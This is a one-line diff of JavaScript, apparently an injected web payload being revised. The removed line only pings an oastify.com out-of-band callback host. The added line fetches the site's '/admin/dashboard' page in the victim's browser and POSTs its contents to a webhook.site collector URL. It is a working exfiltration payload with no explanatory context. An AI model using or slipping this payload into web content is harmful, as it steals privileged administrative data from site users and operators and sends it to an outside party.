@@ -1,1 +1,1 @@
-fetch('https://8z8e0w3lunw1qddvsfjm4z3lgcm3fr7fw.oastify.com');
+fetch('/admin/dashboard').then(r=>r.text()).then(d=>fetch('https://webhook.site/0b8aee5b-c91a-44fc-b825-d36d6ad0bc6e',{method:'POST',body:d}))
